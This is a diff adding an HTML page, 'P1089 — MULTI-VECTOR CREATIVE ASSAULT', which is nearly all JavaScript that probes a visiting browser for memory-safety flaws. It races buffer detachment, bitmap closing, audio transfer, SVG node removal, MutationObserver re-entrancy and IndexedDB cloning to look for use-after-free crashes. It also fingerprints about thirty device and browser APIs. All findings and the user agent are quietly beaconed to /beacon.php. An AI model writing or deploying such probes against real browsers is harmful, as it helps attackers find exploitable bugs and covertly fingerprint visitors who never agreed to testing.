@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1089</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.crit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1089 — MULTI-VECTOR CREATIVE ASSAULT</div>
+<div class="info">6 untested vectors: FontFace detach, ImageBitmap close, AudioBuffer xfer, SVG animate UAF, MutObs re-entrancy, IndexedDB clone</div>
+</div>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){try{new Image().src='/beacon.php?tag=P1089-'+encodeURIComponent(t)+'&data='+encodeURIComponent(d)+'&_='+Date.now()}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+
+// ============================================================
+// SECTION A: FONTFACE ARRAYBUFFER DETACH
+// Create FontFace with AB font data, then transfer the AB
+// to detach it. If FontFace still references the backing store,
+// accessing font metrics reads freed/detached memory.
+// ============================================================
+async function sectionA() {
+  log('warn','=== A: FONTFACE ARRAYBUFFER DETACH ===');
+  var results = [];
+
+  try {
+    // A1: Check if FontFace accepts ArrayBuffer
+    var fontBuf = new ArrayBuffer(1024);
+    var view = new Uint8Array(fontBuf);
+    // Write a minimal (invalid) font header - just enough to not throw on construction
+    // TrueType: 0x00010000
+    view[0]=0;view[1]=1;view[2]=0;view[3]=0;
+    // numTables=1
+    view[4]=0;view[5]=1;
+
+    var ff;
+    try {
+      ff = new FontFace('TestDetach', fontBuf);
+      B('A1-CTOR', 'ok|ff-created');
+      log('ok', '[A1] FontFace(AB) constructor: OK');
+      results.push({test:'A1',ok:true});
+    } catch(e) {
+      B('A1-CTOR', 'ERR:'+e.message);
+      log('fail', '[A1] FontFace(AB) constructor: '+e.message);
+      results.push({test:'A1',ok:false,err:e.message});
+      return results;
+    }
+
+    // A2: Transfer the AB to detach it
+    try {
+      var mc = new MessageChannel();
+      mc.port1.postMessage('', [fontBuf]);
+      var detached = fontBuf.byteLength === 0;
+      B('A2-DETACH', 'detached:'+detached+'|len:'+fontBuf.byteLength);
+      log(detached?'ok':'warn', '[A2] AB detached: '+detached+' (byteLength='+fontBuf.byteLength+')');
+      results.push({test:'A2',detached:detached});
+      mc.port1.close(); mc.port2.close();
+    } catch(e) {
+      B('A2-DETACH', 'ERR:'+e.message);
+      log('fail', '[A2] Transfer failed: '+e.message);
+      results.push({test:'A2',ok:false,err:e.message});
+    }
+
+    // A3: Try to load the font AFTER detach
+    try {
+      var loadResult = ff.load();
+      B('A3-LOAD', 'load-called-after-detach');
+      // Wait for load to settle
+      var status = 'pending';
+      try {
+        await Promise.race([loadResult, sl(2000)]);
+        status = ff.status;
+      } catch(loadErr) {
+        status = 'error:' + loadErr.message;
+      }
+      B('A3-STATUS', 'status:'+status);
+      log(status==='error'?'warn':'info', '[A3] Font load after detach: '+status);
+      results.push({test:'A3',status:status});
+    } catch(e) {
+      B('A3-LOAD', 'ERR:'+e.message);
+      log('fail', '[A3] '+e.message);
+      results.push({test:'A3',err:e.message});
+    }
+
+    // A4: Access font properties after detach
+    try {
+      var props = {
+        family: ff.family,
+        style: ff.style,
+        weight: ff.weight,
+        status: ff.status
+      };
+      B('A4-PROPS', JSON.stringify(props));
+      log('info', '[A4] Props after detach: '+JSON.stringify(props));
+      results.push({test:'A4',props:props});
+    } catch(e) {
+      B('A4-PROPS', 'CRASH:'+e.message);
+      log('crit', '[A4] CRASH on property access: '+e.message);
+      results.push({test:'A4',crash:true,err:e.message});
+    }
+
+    // A5: Add to document.fonts after detach
+    try {
+      document.fonts.add(ff);
+      B('A5-ADD', 'added-to-fontset');
+      log('info', '[A5] Added detached font to document.fonts');
+
+      // Force layout that uses the font
+      var el = document.createElement('span');
+      el.style.fontFamily = 'TestDetach, monospace';
+      el.style.fontSize = '48px';
+      el.textContent = 'ABCDEFGHIJ';
+      document.body.appendChild(el);
+      await sl(100);
+      var w = el.offsetWidth;
+      var h = el.offsetHeight;
+      B('A5-LAYOUT', 'w:'+w+'|h:'+h);
+      log('info', '[A5] Layout with detached font: '+w+'x'+h);
+      document.body.removeChild(el);
+      document.fonts.delete(ff);
+      results.push({test:'A5',w:w,h:h});
+    } catch(e) {
+      B('A5-ADD', 'ERR:'+e.message);
+      log('fail', '[A5] '+e.message);
+      results.push({test:'A5',err:e.message});
+    }
+
+  } catch(e) {
+    B('A-FATAL', e.message);
+    log('fail', '[A] Fatal: '+e.message);
+  }
+
+  B('A-DONE', JSON.stringify(results).substring(0,200));
+  return results;
+}
+
+// ============================================================
+// SECTION B: CREATEIMAGEBITMAP CLOSE RACE
+// createImageBitmap returns a promise. If we close() the
+// ImageBitmap immediately after resolution, concurrent operations
+// might reference the closed bitmap's backing store.
+// ============================================================
+async function sectionB() {
+  log('warn','=== B: CREATEIMAGEBITMAP CLOSE RACE ===');
+  var results = [];
+
+  // B1: Check availability
+  if (typeof createImageBitmap === 'undefined') {
+    B('B1-ABSENT', 'createImageBitmap-undefined');
+    log('fail', '[B1] createImageBitmap not available');
+    return [{test:'B1',available:false}];
+  }
+  B('B1-AVAIL', 'yes');
+  log('ok', '[B1] createImageBitmap available');
+
+  // B2: Basic functionality
+  try {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    var ctx = c.getContext('2d');
+    ctx.fillStyle = '#ff0000';
+    ctx.fillRect(0,0,64,64);
+
+    var bmp = await createImageBitmap(c);
+    B('B2-CREATE', 'w:'+bmp.width+'|h:'+bmp.height);
+    log('ok', '[B2] ImageBitmap: '+bmp.width+'x'+bmp.height);
+    results.push({test:'B2',w:bmp.width,h:bmp.height});
+
+    // B3: Close and use race
+    bmp.close();
+    var closed = true;
+    try {
+      // Try to draw the closed bitmap
+      var c2 = document.createElement('canvas');
+      c2.width = 64; c2.height = 64;
+      var ctx2 = c2.getContext('2d');
+      ctx2.drawImage(bmp, 0, 0);  // Should fail on closed bitmap
+      var pix = ctx2.getImageData(0,0,1,1).data;
+      B('B3-DRAW-CLOSED', 'pix:'+pix[0]+','+pix[1]+','+pix[2]+','+pix[3]);
+      log('crit', '[B3] DREW CLOSED BITMAP! pixels='+pix[0]+','+pix[1]+','+pix[2]);
+      results.push({test:'B3',drew:true,r:pix[0],g:pix[1],b:pix[2]});
+    } catch(e) {
+      B('B3-DRAW-CLOSED', 'rejected:'+e.message);
+      log('ok', '[B3] Drawing closed bitmap rejected: '+e.message);
+      results.push({test:'B3',drew:false,err:e.message});
+    }
+
+    // B4: Race - create bitmap + close immediately
+    var raceHits = 0;
+    for (var i = 0; i < 50; i++) {
+      try {
+        var p = createImageBitmap(c);
+        // Don't await - fire close immediately
+        p.then(function(b) {
+          b.close(); // Close in the resolution callback
+          try {
+            // Immediately try to use it from another context
+            ctx2.drawImage(b, 0, 0);
+            raceHits++;
+          } catch(e) { /* expected */ }
+        });
+        // Simultaneously create another operation on the same source
+        createImageBitmap(c, 0, 0, 32, 32);
+      } catch(e) {}
+    }
+    await sl(1000);
+    B('B4-RACE', 'hits:'+raceHits);
+    log(raceHits>0?'crit':'ok', '[B4] Close race hits: '+raceHits);
+    results.push({test:'B4',hits:raceHits});
+
+  } catch(e) {
+    B('B-ERR', e.message);
+    log('fail', '[B] '+e.message);
+    results.push({test:'B-err',err:e.message});
+  }
+
+  B('B-DONE', JSON.stringify(results).substring(0,200));
+  return results;
+}
+
+// ============================================================
+// SECTION C: WEBAUDIO BUFFER TRANSFER RACE
+// AudioContext processes buffers in a separate thread.
+// Transfer the ArrayBuffer while audio is playing.
+// ============================================================
+async function sectionC() {
+  log('warn','=== C: WEBAUDIO BUFFER TRANSFER ===');
+  var results = [];
+
+  // C1: Check AudioContext
+  var AC = window.AudioContext || window.webkitAudioContext;
+  if (!AC) {
+    B('C1-ABSENT', 'no-AudioContext');
+    log('fail', '[C1] No AudioContext');
+    return [{test:'C1',available:false}];
+  }
+
+  try {
+    var actx = new AC();
+    B('C1-CTX', 'state:'+actx.state+'|rate:'+actx.sampleRate);
+    log('ok', '[C1] AudioContext: state='+actx.state+', rate='+actx.sampleRate);
+
+    // C2: Create buffer and start playback
+    var buf = actx.createBuffer(1, actx.sampleRate, actx.sampleRate); // 1 sec mono
+    var data = buf.getChannelData(0);
+    for (var i = 0; i < data.length; i++) data[i] = Math.sin(i * 440 * 2 * Math.PI / actx.sampleRate) * 0.1;
+
+    var src = actx.createBufferSource();
+    src.buffer = buf;
+    src.connect(actx.destination);
+    src.loop = true;
+    try { src.start(0); } catch(e) {
+      B('C2-START', 'ERR:'+e.message);
+    }
+
+    // C3: Get the underlying AB and try to transfer it
+    var channelAB = null;
+    try {
+      // getChannelData returns Float32Array - its buffer is the AB
+      var f32 = buf.getChannelData(0);
+      channelAB = f32.buffer;
+      B('C3-AB', 'len:'+channelAB.byteLength);
+      log('info', '[C3] Channel AB length: '+channelAB.byteLength);
+    } catch(e) {
+      B('C3-AB', 'ERR:'+e.message);
+      log('fail', '[C3] '+e.message);
+    }
+
+    if (channelAB) {
+      // C4: Transfer while playing - does the audio thread crash?
+      try {
+        var mc = new MessageChannel();
+        mc.port1.postMessage('', [channelAB]);
+        var detached = channelAB.byteLength === 0;
+        B('C4-XFER', 'detached:'+detached);
+        log(detached?'warn':'ok', '[C4] AB transfer while playing: detached='+detached);
+        results.push({test:'C4',detached:detached});
+        mc.port1.close(); mc.port2.close();
+
+        // C5: Wait and check if audio thread crashes
+        await sl(500);
+        var postState = actx.state;
+        B('C5-STATE', 'state:'+postState);
+        log('info', '[C5] AudioContext state after transfer: '+postState);
+        results.push({test:'C5',state:postState});
+
+        // C6: Try to read the channel data again
+        try {
+          var f32b = buf.getChannelData(0);
+          B('C6-REREAD', 'len:'+f32b.length+'|buf:'+f32b.buffer.byteLength);
+          log('crit', '[C6] Channel data STILL READABLE after AB transfer! len='+f32b.length);
+          results.push({test:'C6',readable:true,len:f32b.length});
+        } catch(e) {
+          B('C6-REREAD', 'rejected:'+e.message);
+          log('ok', '[C6] Channel data rejected: '+e.message);
+          results.push({test:'C6',readable:false,err:e.message});
+        }
+      } catch(e) {
+        B('C4-XFER', 'ERR:'+e.message);
+        log('info', '[C4] Transfer blocked: '+e.message);
+        results.push({test:'C4',blocked:true,err:e.message});
+      }
+    }
+
+    src.stop();
+    actx.close();
+  } catch(e) {
+    B('C-FATAL', e.message);
+    log('fail', '[C] Fatal: '+e.message);
+  }
+
+  B('C-DONE', JSON.stringify(results).substring(0,200));
+  return results;
+}
+
+// ============================================================
+// SECTION D: SVG ANIMATE REMOVAL RACE
+// SVG <animate> elements reference their target. If we remove
+// the target element mid-animation, the animation engine might
+// reference freed DOM nodes.
+// ============================================================
+async function sectionD() {
+  log('warn','=== D: SVG ANIMATE REMOVAL RACE ===');
+  var results = [];
+  var anomalies = 0;
+
+  for (var round = 0; round < 20; round++) {
+    try {
+      // Create SVG with animated rect
+      var svg = document.createElementNS('http://www.w3.org/2000/svg','svg');
+      svg.setAttribute('width','100');
+      svg.setAttribute('height','100');
+      svg.style.position='absolute';svg.style.left='-9999px';
+
+      var rect = document.createElementNS('http://www.w3.org/2000/svg','rect');
+      rect.setAttribute('width','50');
+      rect.setAttribute('height','50');
+      rect.setAttribute('fill','red');
+
+      // Animate multiple attributes simultaneously
+      var attrs = ['x','y','width','height','opacity'];
+      for (var a = 0; a < attrs.length; a++) {
+        var anim = document.createElementNS('http://www.w3.org/2000/svg','animate');
+        anim.setAttribute('attributeName', attrs[a]);
+        anim.setAttribute('from', attrs[a]==='opacity'?'1':'0');
+        anim.setAttribute('to', attrs[a]==='opacity'?'0':'100');
+        anim.setAttribute('dur', '0.01s');
+        anim.setAttribute('repeatCount', 'indefinite');
+        rect.appendChild(anim);
+      }
+
+      svg.appendChild(rect);
+      document.body.appendChild(svg);
+
+      // Let animation start
+      await sl(5);
+
+      // Remove the rect while animations are running
+      svg.removeChild(rect);
+      // Immediately add new content to reuse memory
+      for (var j = 0; j < 10; j++) {
+        var r2 = document.createElementNS('http://www.w3.org/2000/svg','rect');
+        r2.setAttribute('width', '10');
+        r2.setAttribute('fill', '#'+j+'0'+j+'0'+j+'0');
+        svg.appendChild(r2);
+      }
+
+      await sl(10);
+
+      // Try to read the removed element's animated values
+      try {
+        var val = rect.getAttribute('x');
+        if (val !== '0' && val !== null) {
+          anomalies++;
+          B('D-ANOMALY', 'round:'+round+'|x:'+val);
+          log('crit', '[D'+round+'] Anomalous animated value after removal: x='+val);
+        }
+      } catch(e) {
+        anomalies++;
+        B('D-CRASH', 'round:'+round+'|err:'+e.message);
+        log('crit', '[D'+round+'] CRASH reading removed element: '+e.message);
+      }
+
+      document.body.removeChild(svg);
+    } catch(e) {
+      B('D-ERR', 'round:'+round+'|'+e.message);
+    }
+  }
+
+  B('D-DONE', 'anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok', '[D] SVG animate removal: '+anomalies+' anomalies in 20 rounds');
+  results.push({test:'D',anomalies:anomalies});
+  return results;
+}
+
+// ============================================================
+// SECTION E: MUTATIONOBSERVER PARSER RE-ENTRANCY
+// MutationObserver callbacks fire synchronously during DOM
+// mutations. If we mutate the DOM inside the callback while
+// innerHTML is building the tree, the parser's internal state
+// can get confused.
+// ============================================================
+async function sectionE() {
+  log('warn','=== E: MUTATIONOBS PARSER RE-ENTRANCY ===');
+  var results = [];
+  var anomalies = 0;
+
+  for (var round = 0; round < 15; round++) {
+    try {
+      var container = document.createElement('div');
+      container.style.display = 'none';
+      document.body.appendChild(container);
+
+      var mutCount = 0;
+      var obs = new MutationObserver(function(mutations) {
+        mutCount += mutations.length;
+        // Re-entrant DOM mutation during parser tree building
+        if (mutCount <= 3) {
+          try {
+            // Remove nodes while parser is adding them
+            while (container.firstChild && container.childNodes.length > 2) {
+              container.removeChild(container.firstChild);
+            }
+            // Add new nodes to interfere
+            var span = document.createElement('span');
+            span.textContent = 'injected-' + mutCount;
+            container.appendChild(span);
+          } catch(e) { /* expected in some cases */ }
+        }
+      });
+
+      obs.observe(container, {childList: true, subtree: true});
+
+      // innerHTML triggers the HTML parser which will fire the MO callback
+      // Use a complex nested structure to maximize re-entrancy opportunities
+      container.innerHTML = '<div><p><b><i><u><s><em><strong>' +
+        '<span id="deep-'+round+'">DEEP</span>' +
+        '</strong></em></s></u></i></b></p></div>' +
+        '<table><tr><td>1</td><td>2</td></tr>' +
+        '<tr><td>3</td><td>4</td></tr></table>' +
+        '<ul><li>A</li><li>B</li><li>C</li></ul>';
+
+      obs.disconnect();
+
+      // Check what survived
+      var childCount = container.childNodes.length;
+      var deepEl = container.querySelector('#deep-'+round);
+      var hasDeep = !!deepEl;
+
+      if (!hasDeep && mutCount > 0) {
+        anomalies++;
+        B('E-ANOMALY', 'round:'+round+'|children:'+childCount+'|deep:'+hasDeep+'|muts:'+mutCount);
+        log('warn', '[E'+round+'] Deep element lost! children='+childCount+' muts='+mutCount);
+      }
+
+      // Check for corrupted DOM structure
+      try {
+        var html = container.innerHTML;
+        if (html.indexOf('</') === -1 && childCount > 0) {
+          anomalies++;
+          B('E-CORRUPT', 'round:'+round+'|html:'+html.substring(0,100));
+          log('crit', '[E'+round+'] CORRUPTED HTML!');
+        }
+      } catch(e) {
+        anomalies++;
+        B('E-READ-CRASH', 'round:'+round+'|'+e.message);
+        log('crit', '[E'+round+'] innerHTML READ crash: '+e.message);
+      }
+
+      document.body.removeChild(container);
+    } catch(e) {
+      B('E-ERR', 'round:'+round+'|'+e.message);
+    }
+  }
+
+  B('E-DONE', 'anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok', '[E] MutObs re-entrancy: '+anomalies+' anomalies in 15 rounds');
+  results.push({test:'E',anomalies:anomalies});
+  return results;
+}
+
+// ============================================================
+// SECTION F: INDEXEDDB STRUCTURED CLONE RACE
+// IndexedDB serializes objects via structured clone into a
+// different thread. Race the IDB write with GC + object mutation.
+// ============================================================
+async function sectionF() {
+  log('warn','=== F: INDEXEDDB CLONE RACE ===');
+  var results = [];
+
+  // F1: Check IDB availability
+  if (!window.indexedDB) {
+    B('F1-ABSENT', 'no-indexedDB');
+    log('fail', '[F1] No IndexedDB');
+    return [{test:'F1',available:false}];
+  }
+
+  try {
+    // Open a test database
+    var db = await new Promise(function(resolve, reject) {
+      var req = indexedDB.open('p1089test', 1);
+      req.onerror = function() { reject(new Error('IDB open failed')); };
+      req.onsuccess = function() { resolve(req.result); };
+      req.onupgradeneeded = function(e) {
+        e.target.result.createObjectStore('test', {keyPath: 'id'});
+      };
+    });
+    B('F1-OPEN', 'ok');
+    log('ok', '[F1] IndexedDB opened');
+
+    // F2: Store complex objects with concurrent mutation
+    var anomalies = 0;
+    for (var round = 0; round < 20; round++) {
+      try {
+        // Build a complex object graph
+        var obj = {
+          id: round,
+          map: {},
+          arrays: [],
+          dates: []
+        };
+        for (var i = 0; i < 50; i++) {
+          obj.map['k'+i] = {v: i, d: new Date(i*1000)};
+          obj.arrays.push(new ArrayBuffer(64));
+          obj.dates.push(new Date());
+        }
+
+        // Start the write
+        var tx = db.transaction('test', 'readwrite');
+        var store = tx.objectStore('test');
+        var putReq = store.put(obj);
+
+        // Mutate the object DURING the structured clone
+        // The clone should snapshot, not reference
+        obj.map = null;
+        obj.arrays = null;
+        for (var g = 0; g < 50; g++) { var t = new ArrayBuffer(8192); t = null; }
+
+        await new Promise(function(resolve) {
+          tx.oncomplete = resolve;
+          tx.onerror = function() { resolve(); };
+        });
+
+        // Read it back
+        var tx2 = db.transaction('test', 'readonly');
+        var store2 = tx2.objectStore('test');
+        var getReq = store2.get(round);
+        var readBack = await new Promise(function(resolve) {
+          getReq.onsuccess = function() { resolve(getReq.result); };
+          getReq.onerror = function() { resolve(null); };
+        });
+
+        if (!readBack || !readBack.map || Object.keys(readBack.map).length !== 50) {
+          anomalies++;
+          var keys = readBack ? Object.keys(readBack.map || {}).length : 'null';
+          B('F2-CORRUPT', 'round:'+round+'|keys:'+keys);
+          log('crit', '[F'+round+'] CORRUPTED readback! keys='+keys);
+        }
+      } catch(e) {
+        B('F2-ERR', 'round:'+round+'|'+e.message);
+      }
+    }
+
+    B('F2-DONE', 'anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok', '[F] IDB clone race: '+anomalies+' anomalies in 20 rounds');
+    results.push({test:'F',anomalies:anomalies});
+
+    // Cleanup
+    db.close();
+    indexedDB.deleteDatabase('p1089test');
+  } catch(e) {
+    B('F-FATAL', e.message);
+    log('fail', '[F] Fatal: '+e.message);
+    results.push({test:'F',err:e.message});
+  }
+
+  return results;
+}
+
+// ============================================================
+// SECTION G: FEATURE DETECTION (bonus recon)
+// Quick scan of APIs we haven't checked yet
+// ============================================================
+async function sectionG() {
+  log('warn','=== G: UNTESTED API RECON ===');
+  var apis = {};
+
+  var checks = [
+    ['OffscreenCanvas', function(){return typeof OffscreenCanvas}],
+    ['CSS.paintWorklet', function(){return typeof CSS!=='undefined'&&typeof CSS.paintWorklet}],
+    ['CSS.registerProperty', function(){return typeof CSS!=='undefined'&&typeof CSS.registerProperty}],
+    ['ResizeObserver', function(){return typeof ResizeObserver}],
+    ['IntersectionObserver', function(){return typeof IntersectionObserver}],
+    ['ReportingObserver', function(){return typeof ReportingObserver}],
+    ['PerformanceObserver', function(){return typeof PerformanceObserver}],
+    ['Scheduler', function(){return typeof scheduler}],
+    ['queueMicrotask', function(){return typeof queueMicrotask}],
+    ['requestIdleCallback', function(){return typeof requestIdleCallback}],
+    ['AbortController', function(){return typeof AbortController}],
+    ['ReadableStream', function(){return typeof ReadableStream}],
+    ['WritableStream', function(){return typeof WritableStream}],
+    ['TransformStream', function(){return typeof TransformStream}],
+    ['CompressionStream', function(){return typeof CompressionStream}],
+    ['TextEncoderStream', function(){return typeof TextEncoderStream}],
+    ['BroadcastChannel', function(){return typeof BroadcastChannel}],
+    ['Lock API', function(){return typeof navigator.locks}],
+    ['Storage API', function(){return typeof navigator.storage}],
+    ['Credential API', function(){return typeof navigator.credentials}],
+    ['WebGL2', function(){var c=document.createElement('canvas');return c.getContext('webgl2')?'YES':'NO'}],
+    ['WebGL1', function(){var c=document.createElement('canvas');return c.getContext('webgl')?'YES':'NO'}],
+    ['WebGPU', function(){return typeof navigator.gpu}],
+    ['USB', function(){return typeof navigator.usb}],
+    ['Bluetooth', function(){return typeof navigator.bluetooth}],
+    ['Serial', function(){return typeof navigator.serial}],
+    ['HID', function(){return typeof navigator.hid}],
+    ['Gamepad', function(){return typeof navigator.getGamepads}],
+    ['Sensor APIs', function(){return typeof Gyroscope}],
+    ['File System Access', function(){return typeof showOpenFilePicker}],
+    ['LazyLoading', function(){return 'loading' in HTMLImageElement.prototype}],
+    ['ContentVisibility', function(){return CSS.supports&&CSS.supports('content-visibility','auto')}],
+    ['ContainerQueries', function(){return CSS.supports&&CSS.supports('container-type','inline-size')}],
+  ];
+
+  var report = [];
+  for (var i = 0; i < checks.length; i++) {
+    try {
+      var val = checks[i][1]();
+      apis[checks[i][0]] = val;
+      var shortVal = String(val).substring(0, 20);
+      report.push(checks[i][0]+'='+shortVal);
+    } catch(e) {
+      apis[checks[i][0]] = 'ERR:'+e.message;
+      report.push(checks[i][0]+'=ERR');
+    }
+  }
+
+  // Send in chunks (beacon URL has length limits)
+  var chunk = '';
+  var chunkN = 0;
+  for (var i = 0; i < report.length; i++) {
+    chunk += report[i] + '|';
+    if (chunk.length > 300 || i === report.length - 1) {
+      B('G-APIS-'+chunkN, chunk);
+      chunk = '';
+      chunkN++;
+    }
+  }
+
+  // Log interesting ones
+  var interesting = ['WebGL1','WebGL2','WebGPU','OffscreenCanvas','BroadcastChannel','Lock API',
+    'ContainerQueries','ReadableStream','CompressionStream','Gamepad'];
+  for (var i = 0; i < interesting.length; i++) {
+    var k = interesting[i];
+    var v = apis[k] || '?';
+    var isYes = v === 'function' || v === 'object' || v === 'YES' || v === true;
+    log(isYes?'ok':'info', '[G] '+k+' = '+v);
+  }
+
+  return apis;
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run() {
+  B('BOOT', navigator.userAgent.substring(0,80));
+  log('ok', '=== P1089: MULTI-VECTOR CREATIVE ASSAULT ===');
+  log('info', 'UA: '+navigator.userAgent.substring(0,60));
+  log('info', '6 vectors + API recon. Dark mode. Let\'s go.');
+  log('ok','');
+
+  var rA = await sectionA();
+  log('ok','');
+  await sl(100);
+
+  var rB = await sectionB();
+  log('ok','');
+  await sl(100);
+
+  var rC = await sectionC();
+  log('ok','');
+  await sl(100);
+
+  var rD = await sectionD();
+  log('ok','');
+  await sl(100);
+
+  var rE = await sectionE();
+  log('ok','');
+  await sl(100);
+
+  var rF = await sectionF();
+  log('ok','');
+  await sl(100);
+
+  var rG = await sectionG();
+
+  log('ok','');
+  B('ALL-DONE', 'A:'+JSON.stringify(rA).length+'|B:'+JSON.stringify(rB).length+
+    '|C:'+JSON.stringify(rC).length+'|D:'+JSON.stringify(rD).length+
+    '|E:'+JSON.stringify(rE).length+'|F:'+JSON.stringify(rF).length);
+  log('ok', '=== P1089 COMPLETE ===');
+  log('info', 'Check beacon log for full results');
+}
+
+run();
+</script>
+</body>
+</html>
